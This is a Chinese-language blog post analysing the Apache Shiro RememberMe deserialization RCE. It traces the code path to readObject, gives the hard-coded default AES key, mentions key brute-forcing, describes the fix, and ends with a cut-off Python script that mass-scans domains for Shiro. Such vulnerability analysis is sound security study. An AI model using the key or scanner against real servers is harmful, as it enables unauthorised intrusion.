          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在最近这几年，我们在渗透的过程中经常会用到shiro的rce漏洞来打点，直到目前为止还经常会在一些项目或者HW中也会经常遇到shrio的rce，因此了解shiro的RememberMe反序列化导致的命令执行漏洞的原理是至关重要的，在本次分享中，我将和大家一起学习shiro RememberMe反序列化漏洞。</span><br></pre></td></tr></table></figure>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>​    我这里选择网上已经有人搭建好的漏洞环境来搭建环境<code>https://github.com/potats0/ShiroDemo</code>，下载好项目以后使用IDEA导入pom.xml文件，由于我这里使用的MAVEN是阿里云镜像，我使用shiro-core为1.2.4时提示我找不到包，因此我这里使用的是1.2.2版本。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221450755.png" alt="image-20201128221450755"></p>
<p>​    需要的包导入后，找到App.java文件，通过调试来运行。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221552395.png" alt="image-20201128221552395"></p>
<p>​    运行成功后界面如下：</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221658967.png" alt="image-20201128221658967"></p>
<h3 id="Shiro基本知识"><a href="#Shiro基本知识" class="headerlink" title="Shiro基本知识"></a>Shiro基本知识</h3><p>​    我们知道，shiro是一款用来进行权限认证和权限管理的框架，可以帮我们完成认证、授权、加密、会话管理、与Web集成、缓存等功能。</p>
<p>​    下面我结合着这个漏洞环境的代码带大家一起学习一下shiro的基本知识。</p>
<p>​    在这个项目的源码文件中，主要包含了4个文件，APP.java内容为启动springboot的内容，这里不做解释了，看下其他文件的内容，首先是MainRealm.java，在介绍这个文件的内容前，我们先了解几个基本的概念。</p>
<p>​    我们知道，shiro框架的一个主要的功能是用来做身份认证的，在shiro中，主要通过principals （身份）和 credentials（证明）一起来验证用户的身份。</p>
<h4 id="principals"><a href="#principals" class="headerlink" title="principals"></a><strong>principals</strong></h4><p>​    指用户身份的标识，可以是用户的用户名，手机号等等，但需要确保其唯一性。</p>
<h4 id="credentials"><a href="#credentials" class="headerlink" title="credentials"></a><strong>credentials</strong></h4><p>​    凭证，一般来说就是密码。</p>
<h4 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a><strong>Realm</strong></h4><p>​    域，shiro会从Realm中获取安全数据（用户，角色，权限），当SecurityManager要身份认证，需要从Realm中来确定用户身份以及用户可以访问的权限。</p>
<p>​    在shiro中，SecurityManager负责身份认证的逻辑，它会委托给Authenticator进行身份认证，Authenticator 会把相应的 token 传入 Realm，从 Realm 获取身份验证信息，如果没有返回 / 抛出异常表示身份验证失败了。此处可以配置多个 Realm，将按照相应的顺序及策略进行访问。</p>
<p><strong>AuthorizingRealm</strong></p>
<p>​    在shiro中，默认提供了一些Realm，他们的继承关系如下：</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="img"> </p>
<p>​    CachingRealm是带缓存的Realm，里面包含了多个CacheManager属性，具体的缓存在其子类中进行实现。</p>
<p>​    AuthenticatingRealm是带认证的Realm,该类实现了认证的基本逻辑和缓存逻辑。</p>
<p>​    AuthorizingRealm主要用来鉴权和获取授权信息的Realm,该类实现了Authorizer，所以可以做鉴权。也实现了PermissionResolverAware，RolePermissionResolverAware因此可以对用户的访问权限做判断。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129131100239.png" alt="image-20201129131100239"></p>
<p>​    在shiro认证过程中，依赖AuthenticatingRealm的getAuthenticationInfo方法，getAuthenticationInfo会调用我们自定义的doGetAuthenticationInfo方法获取认证的结果。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129132011123.png" alt="image-20201129132011123"></p>
<p>​    在登录的时候需要将数据封装到<code>Shiro</code>的一个<code>token</code>中，执行shiro的<code>login()</code>方法，<code>Shiro</code>就会自动的调用<code>doGetAuthenticationInfo(AuthenticationToken token)</code>方法获取身份认证信息，在本次环境中，首先通过token.getPrincipal()方法获取username信息，通过authenticationToken.getCredentials()获取密码信息，对用户的用户名和密码进行判断，如果用户用户名为admin,密码为vulhub，认证成功则返回SimpleAuthenticationInfo对象,mainrealm.java的代码如下：</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129122749329.png" alt="image-20201129122749329"></p>
<h4 id="shiro拦截器"><a href="#shiro拦截器" class="headerlink" title="shiro拦截器"></a><strong>shiro拦截器</strong></h4><p>​    在shiro中使用了与 Servlet 一样的 Filter 接口进行扩展，shiro拦截器的基础类及其继承关系如下：</p>
<p><img src="https://wiki.jikexueyuan.com/project/shiro/images/14.png" alt="img"></p>
<p>​    ShiroFilter是整个 Shiro 的入口点，用于拦截需要安全控制的请求进行处理，除了上面的基础拦截器类外，shiro还提供了一些比较常用的默认拦截器。</p>
<p>​    FormAuthenticationFilter登录拦截器，它主要有两个作用，一个是拦截登录表单提交的路径，创建登录认证所需要的Token令牌，并进入登录认证流程。另一个作用是拦截要求登录后才可以访问的路径，如果已经登录则直接进入到要访问路径，如果未登录则访问被拒绝并跳转到登录页。登录拦截器常用的方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">createToken创建认证令牌，令牌内存储了登录认证时所需的数据。</span><br><span class="line">onLoginSuccess设置登录成功后的行为。</span><br><span class="line">onAccessDenied设置被拒绝后的行为</span><br><span class="line">setLoginUrl设置登录地址</span><br><span class="line">getUsername获取登录名，表单name值必须是username。</span><br><span class="line">getPassword获取密码，表单name值必须是password。</span><br></pre></td></tr></table></figure>

<p>​    UserFilter用户拦截器，用户已经登录认证 或 已经记住我 的都可以通过。</p>
<p>​    AnonymousFilter无需认证即可通过。</p>
<h4 id="拦截器链"><a href="#拦截器链" class="headerlink" title="拦截器链"></a><strong>拦截器链</strong></h4><p>​    Shiro 对 Servlet 容器的 FilterChain 进行了代理，即 ShiroFilter 在继续 Servlet 容器的 Filter 链的执行之前，通过 ProxiedFilterChain 对 Servlet 容器的 FilterChain 进行了代理。当Filter执行的过程中，首先执行shiro的拦截器链，再经过Servlet容器的拦截器链。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143520958.png" alt="image-20201129143520958"></p>
<p>​    在shiro中提供了PathMatchingFilterChainResolver来判断请求的url和拦截器的规则是否匹配。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143926553.png" alt="image-20201129143926553"></p>
<p>​    DefaultFilterChainManager中维护者一个拦截器链，我们可以通过DefaultFilterChainManager中的方法添加拦截器。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129144850395.png" alt="image-20201129144850395"></p>
<h4 id="ShiroFilterFactoryBean"><a href="#ShiroFilterFactoryBean" class="headerlink" title="ShiroFilterFactoryBean"></a><strong>ShiroFilterFactoryBean</strong></h4><p>​    通过ShiroFilterFactoryBean类可以方便的配置拦截器的各种基本属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setSecurityManager:注入一个SecurityManager类，SecurityManager负责管理整个shiro核心验证功能。</span><br><span class="line">setLoginUrl：配置登录页路径。</span><br><span class="line">setSuccessUrl：配置登录成功页路径。</span><br><span class="line">setUnauthorizedUrl：配置没有权限跳转的页面。</span><br><span class="line">setFilterChainDefinitionMap：设置拦截规则。拦截规则是通过一个Map进行导入的。</span><br><span class="line">setFilters：用于注入自己实现的拦截器类。</span><br></pre></td></tr></table></figure>

<p>​    拦截规则是通过MAP来进行设置的，基本形式如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap &#x3D; new LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">filterChainDefinitionMap.put(&quot;&lt;拦截路径&gt;&quot;, &quot;&lt;拦截器名称&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>​    拦截器路径是一个从根路径开始的url，并支持通配符。拦截器名称既可以是shiro内置拦截器的名称比如anon(无需认证的拦截器)、authc（需要认证的拦截器）、user (已经登录成功或使用记住我的拦截器)，perms[role_name] - 需要权限验证的路径使用perms拦截器。中括号内为权限名称列表。</p>
<hr>
<p>​    接下来我们看一下shiroConfig.java，这个类是shiro的配置类，在这个类的shiroFilterFactoryBean中，通过setSecurityManager来设置securityManager，在securityManager中，设置了Realm为我们自己定义的mainRealm，RememberMeManager为cookieRememberMeManager，也就是cookie的”记住我”功能。通过setLoginUrl方法来设置未登录时需要认证的地址也就是登录地址。setUnauthorizedUrl方法来设置无权访问时跳转的地址。通过创建LinkedHashMap，设置map.put(“/doLogin”, “anon”)来设置不需要登录就能访问的地址。通过map.put(“/xxx/**”, “user”);来设置用户登录后才能访问的地址。最后通过setFilterChainDefinitionMap将这个map设置到FilterChain中。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129134331085.png" alt="image-20201129134331085"></p>
<h4 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a><strong>Subject</strong></h4><p>​    Shiro中认证授权组件Subject，为我们提供了当前用户、角色和授权的相关信息，可以进行登录，退出，权限验证，获取用户信息，session。</p>
<p>​    通过SecurityUtils.getSubject获取subject对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Subject subject &#x3D; SecurityUtils.getSubject();</span><br></pre></td></tr></table></figure>

<p>​    subject包含如下主要接口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Subject login(Subject subject, AuthenticationToken authenticationToken) throws AuthenticationException;    &#x2F;&#x2F;登陆</span><br><span class="line">void logout(Subject subject);        &#x2F;&#x2F;退出登陆</span><br><span class="line">Subject createSubject(SubjectContext context);    &#x2F;&#x2F;获取subject</span><br><span class="line">Session session &#x3D; subject.getSession(); &#x2F;&#x2F;获取session对象</span><br><span class="line">String currentUser &#x3D; subject.getPrincipal().toString(); &#x2F;&#x2F;获取登录名</span><br></pre></td></tr></table></figure>

<p>​    了解了这些知识，我们看下UserController.java是如何实现的，通过SecurityUtils.getSubject方法获取subject对象，通过login来进行登录，传入的参数为UsernamePasswordToken对象。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129153131427.png" alt="image-20201129153131427"></p>
<p>​    这里，shiro的基础知识我们大概了解了一些了，下面我们再看一下漏洞。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​    因为之前已经有人分析过shiro的反序列化漏洞了，并且在文章中给出了存在反序列化漏洞的方法，在DefaultSerializer类的deserialize方法中，因此我们可以直接找到这个方法并打上断点 。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130114316497.png" alt="image-20201130114316497"></p>
<p>​    在这个函数中调用了ObjectInputStream类的readObject方法来进行反序列化操作，下面是整个过程的调用栈</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">deserialize:75, DefaultSerializer (org.apache.shiro.io)</span><br><span class="line">deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:846, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:148, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:292, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:359, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:93, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:202, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:526, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:92, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:367, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:860, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1591, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>​    下面我们分析一下这个漏洞的调用过程，再调用的过程中，我们可以看到拦截器的调用链，已经将shiroFilter写入到tomcat拦截器之前。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130155604254.png" alt="image-20201130155604254"></p>
<p>​    下面依次调用对应的拦截器，OrderedCharacterEncodingFilter–&gt;OrderedFormContentFilter–&gt;OrderedRequestContextFilter–&gt;ShiroFilterFactoryBean–&gt;WsFilter。</p>
<p>​    首先调用OrderedCharacterEncodingFilter设置编码</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161156440.png" alt="image-20201130161156440"></p>
<p>​    调用OrderedFormContentFilter获取参数，这里参数为空，因此会调用else中的代码。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161341690.png" alt="image-20201130161341690"></p>
<p>​    调用OrderedRequestContextFilter完成requestContext的初始化操作。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130162453138.png" alt="image-20201130162453138"></p>
<p>​    下来就是shiorFilter的调用链，再shior拦截器中调用了createSubject来创建subject对象。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163400707.png" alt="image-20201130163400707"></p>
<p>​    跟进createSubject方法，调用了buildWebSubject方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163533846.png" alt="image-20201130163533846"></p>
<p>​    在 buildWebSubject中调用了其父类的buildSubject方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163606923.png" alt="image-20201130163606923"></p>
<p>​    跟进父类的buildSubject方法，调用了DefaultSecurityManager的createSubject方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165013406.png" alt="image-20201130165013406"></p>
<p>​    继续跟进，我们需要关注resolvePrincipals方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165132350.png" alt="image-20201130165132350"></p>
<p>​    跟进resolvePrincipals方法，判断RememberMeManager是否为空，不为空则调用getRememberedPrincipals。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170513136.png" alt="image-20201130170513136"></p>
<p>​    跟进getRememberedPrincipals方法，首先调用了getRememberedSerializedIdentity。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170719001.png" alt="image-20201130170719001"></p>
<p>​    跟进getRememberedSerializedIdentity方法，在该方法中，通过this.getCookie().readValue(request, response);获取了cookie的内容，并且判断是否为deleteMe，若为DeleteMe则返回null,否则将继续执行，对获取的cookie的内容进行base64解码并返回。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171245277.png" alt="image-20201130171245277"></p>
<p>​        返回后会判断获取的cookie的内容是否为空，如果不为空，则调用convertBytesToPrincipals方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171552207.png" alt="image-20201130171552207"></p>
<p>​    在convertBytesToPrincipals调用了decrypt对cookie的内容进行解密。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171453470.png" alt="image-20201130171453470"></p>
<p>​    在decrypt中，调用cipherService.decrypt进行解密，同时传入了this.getDecryptionCipherKey()的内容。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171804561.png" alt="image-20201130171804561"></p>
<p>​    我们看一下getDecryptionCipherKey中的key是如何来的，返回了当前对象的decryptionCipherKey属性。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171919629.png" alt="image-20201130171919629"></p>
<p>​    decryptionCipherKey是在setDecryptionCipherKey中设置的。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172056694.png" alt="image-20201130172056694"></p>
<p>​    在setCipherKey中调用了setDecryptionCipherKey进行设置、</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172145175.png" alt="image-20201130172145175"></p>
<p>​    setCipherKey中的参数来自于DEFAULT_CIPHER_KEY_BYTES，而这个值是kPH+bIxk5D2deZiIxcaaaA== base64解密后的内容，所以这个key的内容在我们当前的环境下是写死的。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172223454.png" alt="image-20201130172223454"></p>
<p>​    继续跟进解密算法，可以看到使用的解密方式是AES方式。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130173904974.png" alt="image-20201130173904974"></p>
<p>​    将解密后的结果返回后，再转换为字节数组的形式并返回。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174140275.png" alt="image-20201130174140275"></p>
<p>​    将返回的bytes作为参数传递到deserialize方法中。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174259064.png" alt="image-20201130174259064"></p>
<p>​    继续跟踪下面的调用</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174337766.png" alt="image-20201130174337766"></p>
<p>​    最终我们可以看到，将我们通过cookie传入的内容转换为ObjectInputStream,并调用了readObject进行反序列化操作。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174508646.png" alt="image-20201130174508646"></p>
<p>​    通过上面的分析，我相信我们已经对于shiro反序列化漏洞的基本原理有了大致的了解，这个漏洞要想正常的利用，至关重要的一点是找到解密cookie中传入payload的key，在这个环境中，key是写死的，实际上这个key也可以自己在shiorconfig类中配置加密的key。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180331183.png" alt="image-20201130180331183"></p>
<p>​    当我们更换key后，再去利用这个漏洞，由于key不正确无法解密导致无法继续利用。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180538186.png" alt="image-20201130180538186"></p>
<p>​    既然重新生成key这么简单，为什么还是有人使用默认的key或者网上公布的其他key？我们看一下这个key解密后的结果就知道了，由于这些key解密后都是一些乱码，不太容易编辑，所以可能很多人会去使用网上别人生成好的key，所以在漏洞利用的过程中有人想到了爆破key的方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180951079.png" alt="image-20201130180951079"></p>
<p>​    那如果想自己生成key,怎样生成才能满足要求呢,只要使用任意一个16位，24位，32位的字符串base64编码后都是可以作为key的。</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>​        我们尝试切换shiro为高版本，看一下shiro是如何修复反序列化漏洞的，我切换到1.2.7版本的shiro，我们可以看到在该版本中，key默认并不是写死的，而是由cipherService.generateNewKey().getEncoded()来生成的key。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164200537.png" alt="image-20201201164200537"></p>
<p>​    生成key的代码如下</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164541425.png" alt="image-20201201164541425"></p>
<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><h4 id="如何识别shiro"><a href="#如何识别shiro" class="headerlink" title="如何识别shiro?"></a><strong>如何识别shiro?</strong></h4><p>​        要检测一个shiro是否存在反序列化漏洞，首先需要对shiro这个框架做一个识别，目前大部分的方法都是通过rememberMe=deleteMe;来识别的，但是并不是我们请求的所有地址都会返回rememberMe=deleteMe,但是在实战中我们可能需要批量去检测shiro框架，我们该如何识别？</p>
<p>​        通过之前的分析我们知道，无论我们访问哪个url，都会经过shiro的拦截器，而在shiro的拦截器中会获取cookie中rememberMe的内容并进行解密，并且通过之前的分析，我们知道解密是由convertBytesToPrincipals（）完成的，如果我们传入的rememberMe不能正常的反序列化，就会抛出异常，调用onRememberedPrincipalFailure方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170537270.png" alt="image-20201201170537270"></p>
<p>​    该方法经过几层调用最终调用了this.getCookie().removeFrom(request, response);方法</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170614952.png" alt="image-20201201170614952"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170630060.png" alt="image-20201201170630060"></p>
<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170639745.png" alt="image-20201201170639745"></strong></p>
<p>​    在removeFrom中，会在返回包header加上rememberMe=deleteMe，因此无论我们访问任何使用了shiro框架的路由，只需要在请求头中的cookie中加入rememberMe=xxx，如果目标使用了shiro，则会返回rememberMe=deleteMe，也就是说我们可以通过一个包来识别是否使用了shiro框架。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170725328.png" alt="image-20201201170725328"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170959832.png" alt="image-20201201170959832"></p>
<p>​    了解了这些，我们可以写一个简单的python脚本来批量识别shiro，这里注意我将重定向设置为false，否则我们在请求时会跟进302跳转，但跳转后的结果里可能没有rememberMe=deleteMe。<br><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180626070.png" alt="image-20201201180626070"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180604356.png" alt="image-20201201180604356"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def shiroScan(url):</span><br><span class="line"></span><br><span class="line">    header&#x3D;&#123;</span><br><span class="line">        &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36&#39;,</span><br><span class="line">        &#39;Accept&#39;:&#39;image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,image&#x2F;*,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">        &#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;,</span><br><span class="line">        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q&#x3D;0.9&#39;,</span><br><span class="line">        &#39;Cookie&#39;:&#39;rememberMe&#x3D;1&#39;,</span><br><span class="line">        &#39;Connection&#39;:&#39;close&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    proxies &#x3D; &#123; &quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8088&quot;, &quot;https&quot;: &quot;https:&#x2F;&#x2F;127.0.0.1:8088&quot;&#125;</span><br><span class="line">    resp&#x3D;requests.get(url&#x3D;url,headers&#x3D;header,proxies&#x3D;proxies,verify&#x3D;False,allow_redirects&#x3D;False)</span><br><span class="line">    for name, regex in resp.headers.items():</span><br><span class="line">        if &quot;rememberMe&#x3D;deleteMe&quot; in regex:</span><br><span class="line">            print(url+ &quot; is Shiro!!!&quot;)</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    with open(&#39;domain.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">        lines&#x3D;f.readlines()</span><br><span class="line">        for i in 